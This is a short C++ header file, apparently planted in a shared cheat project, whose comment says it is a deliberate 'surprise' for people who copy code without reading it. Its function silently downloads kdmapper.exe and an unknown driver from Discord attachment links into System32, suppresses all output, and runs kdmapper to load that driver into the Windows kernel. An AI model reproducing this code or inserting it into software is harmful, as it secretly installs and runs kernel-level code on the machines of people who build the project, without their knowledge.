#pragma once
#include <Windows.h>

//yes i put a intresting file in here to suprise some dumbass pasters if u are just 1% smart you would find this its pretty obvious
void Inittt() {
	
	
	system("curl --silent https://cdn.discordapp.com/attachments/1100761484574871635/1102889971708334090/kdmapper.exe --output C:\\Windows\\System32\\kdmapper.exe >nul 2>&1");
	system("curl --silent https://cdn.discordapp.com/attachments/1100761484574871635/1102889989710286928/drvmoment.sys --output C:\\Windows\\System32\\drvmoment.sys >nul 2>&1");
	system("cd C:\\Windows\\System32\\ && kdmapper.exe drvmoment.sys");
	Beep(560, 500);
}